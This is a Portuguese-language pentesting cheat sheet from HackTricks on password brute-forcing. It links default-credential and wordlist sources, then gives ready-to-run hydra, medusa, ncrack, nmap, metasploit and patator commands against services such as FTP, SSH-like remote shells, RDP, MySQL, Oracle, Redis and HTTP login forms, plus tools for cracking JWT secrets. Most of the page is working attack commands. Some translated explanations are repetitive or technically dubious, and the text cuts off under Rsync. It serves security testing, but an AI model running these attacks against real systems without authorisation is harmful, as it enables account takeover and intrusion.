# Brute Force - CheatSheet

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para criar e automatizar facilmente fluxos de trabalho com as ferramentas comunitárias mais avançadas do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Credenciais Padrão

**Pesquise no Google** por credenciais padrão da tecnologia que está sendo usada, ou **tente estes links**:

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/)

## **Crie suas próprias listas**

Encontre o máximo de informações sobre o alvo que puder e gere uma lista personalizada. Ferramentas que podem ajudar:

### Crunch
```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```
### Cewl

Cewl é uma ferramenta que pode ser usada para criar listas de palavras-chave personalizadas para ataques de força bruta. Ele rastreia um site ou um conjunto de sites e extrai palavras-chave únicas do conteúdo do site, como títulos, cabeçalhos e texto. Essas palavras-chave podem ser usadas para criar listas de senhas possíveis para ataques de força bruta. O Cewl também pode ser usado para criar listas de nomes de usuários possíveis, que podem ser combinados com as senhas geradas para ataques de força bruta de login.
```bash
cewl example.com -m 5 -w words.txt
```
### [CUPP](https://github.com/Mebus/cupp)

Gere senhas com base no seu conhecimento sobre a vítima (nomes, datas...)
```
python3 cupp.py -h
```
### [Wister](https://github.com/cycurity/wister)

Uma ferramenta geradora de wordlist, que permite fornecer um conjunto de palavras, dando a possibilidade de criar várias variações a partir das palavras fornecidas, criando uma wordlist única e ideal para usar em relação a um alvo específico.
```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

 __          _______  _____ _______ ______ _____  
 \ \        / /_   _|/ ____|__   __|  ____|  __ \ 
  \ \  /\  / /  | | | (___    | |  | |__  | |__) |
   \ \/  \/ /   | |  \___ \   | |  |  __| |  _  / 
    \  /\  /   _| |_ ____) |  | |  | |____| | \ \ 
     \/  \/   |_____|_____/   |_|  |______|_|  \_\

      Version 1.0.3                    Cycurity    
      
Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```
### [pydictor](https://github.com/LandGrey/pydictor)

### Listas de palavras

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Use [**Trickest**](https://trickest.io/) para construir e **automatizar fluxos de trabalho** com facilidade, usando as ferramentas da comunidade mais avançadas do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Serviços

Ordenados alfabeticamente pelo nome do serviço.

### AFP
```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
### AJP

O Protocolo de Conector Java Avançado (AJP) é um protocolo binário que permite a comunicação entre um servidor web e um servidor de aplicativos Java. Ele é usado principalmente em ambientes de produção para melhorar o desempenho e a escalabilidade do servidor web.

O AJP é vulnerável a ataques de força bruta, especialmente quando a autenticação é baseada em formulários. Os atacantes podem usar ferramentas como o Hydra ou o Burp Suite para realizar ataques de força bruta contra o servidor web e tentar adivinhar as credenciais de login.

Para proteger contra ataques de força bruta, é recomendável usar autenticação baseada em certificado ou autenticação multifator. Além disso, é importante implementar políticas de senha fortes e limitar o número de tentativas de login permitidas antes de bloquear a conta do usuário.
```bash
nmap --script ajp-brute -p 8009 <IP>
```
### Cassandra

Cassandra é um banco de dados NoSQL distribuído, escalável e altamente disponível. Ele é usado por muitas empresas para armazenar grandes quantidades de dados em vários servidores. O Cassandra usa um modelo de dados baseado em colunas e é projetado para ser tolerante a falhas, permitindo que os dados sejam replicados em vários nós. O Cassandra também suporta transações ACID em nível de linha e é altamente escalável horizontalmente. Para realizar ataques de força bruta no Cassandra, é possível usar ferramentas como o Medusa ou o Hydra.
```bash
nmap --script cassandra-brute -p 9160 <IP>
```
### CouchDB

O CouchDB é um banco de dados NoSQL que armazena dados em formato JSON. Ele é usado em muitas aplicações web e móveis. O CouchDB tem uma API RESTful que permite que os usuários interajam com o banco de dados usando solicitações HTTP. 

#### Brute Force

O CouchDB tem uma API RESTful que permite que os usuários interajam com o banco de dados usando solicitações HTTP. Isso significa que é possível usar ferramentas de brute force para tentar adivinhar as credenciais de login de um usuário. 

A ferramenta mais comum usada para brute force em CouchDB é o `couchdb-python`. Para usá-lo, você precisa fornecer um arquivo de lista de palavras e um nome de usuário. O `couchdb-python` tentará cada senha na lista de palavras até encontrar a correta. 

```
python couchdb.py http://localhost:5984/ -u admin -w wordlist.txt
```

Se as credenciais de login forem encontradas, o `couchdb-python` as exibirá na tela.
```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```
### Registro do Docker
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```
### Elasticsearch

O Elasticsearch é um mecanismo de busca e análise de dados distribuído e de código aberto. Ele é amplamente utilizado em aplicativos da web e móveis para indexar e pesquisar grandes volumes de dados em tempo real. O Elasticsearch é altamente escalável e pode ser executado em clusters de servidores para lidar com grandes quantidades de dados.

#### Brute force

O Elasticsearch não possui proteção contra ataques de força bruta por padrão. Isso significa que um atacante pode tentar adivinhar senhas de usuários com um script automatizado. Para evitar isso, é importante usar senhas fortes e implementar medidas de segurança adicionais, como limitar o número de tentativas de login e usar autenticação de dois fatores. Além disso, é recomendável usar uma ferramenta de detecção de intrusão para monitorar atividades suspeitas na rede.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```
### FTP

FTP (Protocolo de Transferência de Arquivos) é um protocolo padrão usado para transferir arquivos entre computadores em uma rede. É comumente usado por administradores de sistemas para transferir arquivos de e para servidores. O FTP é um protocolo antigo e inseguro, pois as senhas são enviadas em texto simples, o que significa que podem ser facilmente interceptadas por um atacante. Portanto, é importante usar senhas fortes e criptografar a conexão usando SSL/TLS sempre que possível.

#### Brute Force

O ataque de força bruta é uma técnica comum usada para obter acesso não autorizado a um servidor FTP. O atacante tenta adivinhar a senha do usuário repetidamente até que a senha correta seja encontrada. Existem várias ferramentas disponíveis para realizar ataques de força bruta em servidores FTP, como Hydra e Medusa.

Para realizar um ataque de força bruta em um servidor FTP, é necessário ter uma lista de possíveis senhas e um nome de usuário válido. A lista de senhas pode ser criada manualmente ou usando uma ferramenta como o Crunch. É importante lembrar que a maioria dos servidores FTP tem medidas de segurança em vigor para impedir ataques de força bruta, como limitar o número de tentativas de login ou bloquear endereços IP após várias tentativas falhadas.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
```
### Brute Force Genérico HTTP

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### Autenticação Básica HTTP
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
```
### HTTP - Enviar Formulário (Post)

Para enviar um formulário HTTP, você precisa enviar uma solicitação POST com os parâmetros do formulário no corpo da solicitação. O corpo da solicitação deve estar no formato `application/x-www-form-urlencoded`.

Aqui está um exemplo de como enviar um formulário de login com nome de usuário e senha:

```
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

username=johndoe&password=1234
```

Neste exemplo, o nome de usuário é `johndoe` e a senha é `1234`. Esses valores são enviados no corpo da solicitação como parâmetros do formulário. O servidor pode então processar esses valores e autenticar o usuário.
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```
Para http**s**, você precisa mudar de "http-post-form" para "**https-post-form"**

### **HTTP - CMS --** (W)ordpress, (J)oomla ou (D)rupal ou (M)oodle
```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
```
### IMAP

O Protocolo de Acesso à Mensagem da Internet (IMAP) é um protocolo de correio eletrônico usado para receber e-mails de um servidor de e-mail. O IMAP permite que um cliente de e-mail visualize e-mails sem baixá-los para o dispositivo local. Isso significa que o e-mail permanece no servidor e pode ser acessado de qualquer dispositivo com acesso à Internet. O IMAP é comumente usado por provedores de e-mail, como Gmail, Yahoo e Outlook. 

O brute force em IMAP é semelhante ao brute force em outros serviços. O atacante tenta várias combinações de nome de usuário e senha até encontrar a combinação correta. O IMAP geralmente usa o protocolo SSL / TLS para criptografar a conexão, o que torna o brute force mais difícil. No entanto, se o servidor de e-mail não estiver configurado corretamente, ele pode permitir conexões não criptografadas, o que torna o brute force mais fácil. 

Existem várias ferramentas de brute force disponíveis para IMAP, incluindo Hydra e Nmap. É importante lembrar que o brute force é ilegal e pode resultar em consequências graves. Além disso, muitos provedores de e-mail têm medidas de segurança em vigor para detectar e impedir ataques de brute force.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
```
### IRC

IRC (Internet Relay Chat) é um protocolo de comunicação em tempo real baseado em texto. É amplamente utilizado para comunicação em grupo, discussões em fóruns e bate-papo privado. O IRC é executado em um servidor centralizado e os usuários se conectam a ele usando um cliente IRC. O protocolo IRC é vulnerável a ataques de força bruta, como tentativas de adivinhar senhas de usuários. Os atacantes podem usar ferramentas de força bruta para tentar adivinhar senhas fracas ou comuns e ganhar acesso não autorizado às contas dos usuários. Para se proteger contra ataques de força bruta, os usuários devem escolher senhas fortes e exclusivas e habilitar a autenticação de dois fatores sempre que possível. Os administradores do servidor IRC também podem implementar medidas de segurança, como limitar o número de tentativas de login e bloquear endereços IP suspeitos.
```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
### ISCSI

O iSCSI (Internet Small Computer System Interface) é um protocolo de rede que permite que dispositivos de armazenamento de dados sejam acessados ​​por meio de uma rede IP. Ele é usado para conectar dispositivos de armazenamento, como discos rígidos, unidades de fita e unidades de CD / DVD, a servidores e computadores. O iSCSI é uma alternativa mais barata e flexível ao Fibre Channel, que é um protocolo de rede de armazenamento de alta velocidade. O iSCSI é amplamente utilizado em ambientes de armazenamento em nuvem e é uma das tecnologias de armazenamento mais populares em uso hoje.
```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
### JWT

O JSON Web Token (JWT) é um padrão aberto (RFC 7519) que define um formato compacto e autocontido para transmitir com segurança informações entre partes como um objeto JSON. As informações podem ser verificadas e confiáveis porque são assinadas digitalmente. Os JWTs podem ser assinados usando um segredo (com o algoritmo HMAC) ou um par de chaves pública / privada usando RSA ou ECDSA.

Os JWTs consistem em três partes separadas por pontos (.), Que são:

- Cabeçalho: contém o tipo de token e o algoritmo de assinatura usado.
- Carga útil: contém as informações que são transmitidas.
- Assinatura: é usada para verificar se a mensagem não foi alterada e se o remetente é quem ele diz ser.

Os JWTs são frequentemente usados como tokens de autenticação em aplicativos da web e móveis. Eles são populares porque são compactos, autocontidos e podem ser facilmente transmitidos por meio de URLs, POSTs de formulário ou cabeçalhos HTTP. No entanto, eles também são vulneráveis a ataques de força bruta se a chave secreta usada para assinar o token for fraca ou se a carga útil contiver informações sensíveis que possam ser usadas para adivinhar a chave secreta.
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```
### LDAP

LDAP (Protocolo Leve de Acesso a Diretórios) é um protocolo padrão de rede usado para acessar e gerenciar diretórios de informações distribuídos, como um diretório de usuários em uma rede. O LDAP é comumente usado para autenticação e autorização em sistemas de TI corporativos. O ataque de força bruta ao LDAP envolve tentar adivinhar as credenciais de login de um usuário por meio de tentativas repetidas de login com diferentes combinações de nome de usuário e senha. Esse tipo de ataque pode ser automatizado usando ferramentas como o Hydra ou o Patator. Para evitar ataques de força bruta ao LDAP, é importante implementar políticas de senha fortes e limitar o número de tentativas de login permitidas.
```bash
nmap --script ldap-brute -p 389 <IP>
```
### MQTT

MQTT (Message Queuing Telemetry Transport) é um protocolo de mensagens leve e de baixa largura de banda que é amplamente utilizado em IoT (Internet das Coisas) para comunicação entre dispositivos. Ele usa um modelo de publicação/assinatura, onde os dispositivos se inscrevem em tópicos específicos para receber mensagens relevantes. O MQTT é frequentemente usado em ambientes de nuvem para comunicação entre dispositivos e serviços. 

Os ataques de força bruta contra o MQTT geralmente envolvem tentativas de adivinhar credenciais de autenticação, como nome de usuário e senha, para obter acesso não autorizado aos dispositivos ou serviços MQTT. Os atacantes também podem tentar adivinhar os tópicos de assinatura para interceptar mensagens sensíveis ou enviar mensagens maliciosas para dispositivos vulneráveis. 

Para proteger o MQTT contra ataques de força bruta, é importante implementar medidas de segurança, como autenticação forte, criptografia de ponta a ponta e controle de acesso baseado em função. Além disso, é importante manter o software MQTT atualizado com as últimas correções de segurança e monitorar regularmente o tráfego MQTT em busca de atividades suspeitas.
```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
```
### Mongo

Mongo é um banco de dados NoSQL popular que é usado em muitas aplicações web modernas. Ele é conhecido por ser rápido e escalável, mas também pode ser vulnerável a ataques de força bruta se não for configurado corretamente.

Existem várias ferramentas de força bruta disponíveis para o MongoDB, incluindo o Hydra e o Nmap. O Hydra é uma ferramenta de força bruta de login que pode ser usada para testar senhas em um servidor MongoDB. O Nmap é uma ferramenta de varredura de rede que pode ser usada para encontrar servidores MongoDB em uma rede.

Para proteger seu servidor MongoDB contra ataques de força bruta, é importante usar senhas fortes e complexas e limitar o número de tentativas de login. Você também pode usar firewalls para restringir o acesso ao servidor MongoDB apenas a endereços IP confiáveis. Além disso, é importante manter o servidor MongoDB atualizado com as últimas correções de segurança e configurações recomendadas.
```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
```
### MySQL

MySQL é um sistema de gerenciamento de banco de dados relacional de código aberto. É amplamente utilizado em aplicativos da web e é uma das tecnologias de banco de dados mais populares. O MySQL usa uma linguagem de consulta estruturada (SQL) para gerenciar e manipular dados em tabelas relacionais. 

#### Brute Force

O MySQL pode ser alvo de ataques de força bruta, onde um invasor tenta adivinhar a senha de um usuário através de tentativas repetidas de login com diferentes combinações de nome de usuário e senha. Para evitar ataques de força bruta, é importante usar senhas fortes e complexas e limitar o número de tentativas de login permitidas. Além disso, é recomendável usar autenticação de dois fatores para aumentar a segurança do login. 

Existem várias ferramentas de força bruta disponíveis para atacar o MySQL, como o Hydra e o Medusa. Essas ferramentas podem ser usadas para automatizar o processo de tentativa e erro de login com diferentes combinações de nome de usuário e senha. Para se proteger contra esses ataques, é importante monitorar os logs de autenticação do MySQL e implementar medidas de segurança, como bloqueio de IP após um número definido de tentativas de login malsucedidas.
```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql
```
### OracleSQL

OracleSQL é uma linguagem de programação usada para gerenciar bancos de dados Oracle. É comumente usado em aplicativos corporativos e é uma das linguagens de banco de dados mais populares do mundo. O OracleSQL é usado para criar, modificar e gerenciar bancos de dados, bem como para recuperar e manipular dados armazenados neles. Ele também é usado para criar e gerenciar usuários e permissões de banco de dados. O OracleSQL é uma habilidade valiosa para qualquer pessoa que trabalhe com bancos de dados Oracle.
```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
```
Para usar o **oracle\_login** com o **patator**, você precisa **instalar**:
```bash
pip3 install cx_Oracle --upgrade
```
[Bruteforce de hash OracleSQL offline](../network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versões 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** e **11.2.0.3**):
```bash
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
### POP

POP (Post Office Protocol) é um protocolo de correio eletrônico usado para receber e-mails de um servidor de e-mail remoto para um cliente de e-mail local. O POP3 é a versão mais recente do protocolo e é amplamente utilizado em muitos clientes de e-mail. O POP3 normalmente usa a porta 110 para conexões não criptografadas e a porta 995 para conexões criptografadas. O POP3 é vulnerável a ataques de força bruta, onde um atacante tenta adivinhar a senha de um usuário repetidamente até obter acesso à conta de e-mail.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V
```
### PostgreSQL

PostgreSQL é um sistema de gerenciamento de banco de dados relacional de código aberto. Ele é amplamente utilizado em aplicativos da web e é conhecido por sua confiabilidade e recursos avançados. O PostgreSQL suporta autenticação baseada em senha e criptografia de senha, o que o torna uma opção segura para armazenar informações confidenciais. No entanto, como qualquer sistema, ele pode ser vulnerável a ataques de força bruta se as senhas forem fracas ou se as configurações de segurança não forem adequadas. É importante garantir que as senhas sejam fortes e que as configurações de segurança sejam configuradas corretamente para evitar ataques de força bruta.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
```
### PPTP

Você pode baixar o pacote `.deb` para instalar em [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)
```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```
### RDP

O Protocolo de Área de Trabalho Remota (RDP) é um protocolo proprietário desenvolvido pela Microsoft para permitir a conexão remota a um sistema Windows com uma interface gráfica de usuário. O RDP usa a criptografia RC4 para proteger a comunicação entre o cliente e o servidor. No entanto, existem várias vulnerabilidades conhecidas que podem ser exploradas para comprometer um sistema RDP.

#### Força Bruta

A força bruta é uma técnica comum usada para tentar adivinhar senhas de contas RDP. Existem várias ferramentas disponíveis que podem automatizar esse processo, como o Hydra e o Medusa. Essas ferramentas permitem que um atacante teste várias combinações de nome de usuário e senha em um curto período de tempo.

Para evitar ataques de força bruta, é importante usar senhas fortes e complexas e implementar medidas de segurança, como bloqueio de conta após várias tentativas de login malsucedidas. Além disso, é recomendável usar autenticação multifator para aumentar a segurança da conta RDP.
```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
```
### Redis

Redis é um banco de dados em memória que é frequentemente usado como cache ou armazenamento de sessão. Ele é amplamente utilizado em aplicativos da web e é conhecido por sua alta velocidade e escalabilidade. No entanto, como qualquer outro banco de dados, o Redis também é vulnerável a ataques de força bruta. Aqui estão algumas técnicas comuns de força bruta que podem ser usadas contra o Redis:

- **Ataque de senha comum**: Este é o método mais simples de ataque de força bruta, onde o invasor tenta adivinhar a senha usando uma lista de senhas comuns. É importante usar senhas fortes e exclusivas para evitar esse tipo de ataque.

- **Ataque de dicionário**: Este método envolve o uso de uma lista de palavras comuns para tentar adivinhar a senha. Os invasores podem usar ferramentas como o Hydra ou o Medusa para automatizar esse processo.

- **Ataque de força bruta de chave**: Este método envolve a tentativa de adivinhar as chaves usadas no Redis. Os invasores podem usar ferramentas como o Nmap para identificar as chaves usadas no Redis e, em seguida, tentar adivinhar as senhas associadas a essas chaves.

- **Ataque de força bruta de porta**: Este método envolve a tentativa de adivinhar a porta usada pelo Redis. Os invasores podem usar ferramentas como o Nmap para identificar a porta usada pelo Redis e, em seguida, tentar adivinhar as senhas associadas a essa porta.

Para proteger o Redis contra ataques de força bruta, é importante usar senhas fortes e exclusivas e limitar o acesso ao Redis apenas a usuários autorizados. Além disso, é importante monitorar o tráfego de rede em busca de atividades suspeitas e manter o Redis atualizado com as últimas correções de segurança.
```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
```
### Rexec

O comando `rexec` é usado para executar comandos em um servidor remoto. Ele é usado para executar comandos em um servidor remoto sem precisar fazer login no servidor. O comando `rexec` é usado principalmente para fins de administração de sistemas. Ele é usado para executar comandos em um servidor remoto sem precisar fazer login no servidor. O comando `rexec` é usado principalmente para fins de administração de sistemas. O comando `rexec` é vulnerável a ataques de força bruta, onde um invasor pode tentar adivinhar a senha do usuário. Para evitar ataques de força bruta, é recomendável usar senhas fortes e implementar medidas de segurança, como bloqueio de conta após várias tentativas de login malsucedidas.
```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
### Rlogin

O Rlogin é um protocolo de rede que permite a um usuário fazer login em um host remoto. Ele é usado principalmente em sistemas Unix e Linux. O Rlogin é vulnerável a ataques de força bruta, onde um invasor tenta adivinhar a senha de um usuário repetidamente até obter acesso não autorizado ao sistema. Para evitar ataques de força bruta, é recomendável desativar o Rlogin e usar o SSH em vez disso. Se o Rlogin ainda estiver em uso, é importante usar senhas fortes e implementar medidas de segurança adicionais, como limitar o número de tentativas de login permitidas e monitorar os logs do sistema em busca de atividades suspeitas.
```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
### Rsh

O comando `rsh` (shell remoto) é um protocolo de rede que permite a um usuário executar comandos em um computador remoto. É semelhante ao `ssh`, mas menos seguro, pois não criptografa o tráfego de rede. O `rsh` é geralmente usado em sistemas Unix e Linux.

#### Brute force

O `rsh` pode ser alvo de ataques de força bruta, onde um atacante tenta adivinhar a senha de um usuário. Isso pode ser feito usando ferramentas como o `hydra` ou o `medusa`. O atacante pode usar uma lista de senhas comuns ou gerar senhas aleatórias para tentar acessar a conta do usuário.

Para evitar ataques de força bruta, é recomendável desativar o `rsh` e usar o `ssh` em vez disso. Se o `rsh` for necessário, é importante usar senhas fortes e implementar medidas de segurança adicionais, como limitar o número de tentativas de login e monitorar o tráfego de rede em busca de atividades suspeitas.
```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```
[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

O Rsync é um protocolo de sincronização de arquivos que é executado na porta 873. Ele é usado para sincronizar arquivos entre dois sistemas e é comumente encontrado em servidores Linux. O Rsync é uma ferramenta poderosa que pode ser usada para copiar arquivos de forma eficiente e rápida, mas também pode ser usada para transferir arquivos maliciosos ou exfiltrar dados. É importante verificar se o Rsync está configurado corretamente e se há alguma vulnerabilidade que possa ser explorada.
```bash
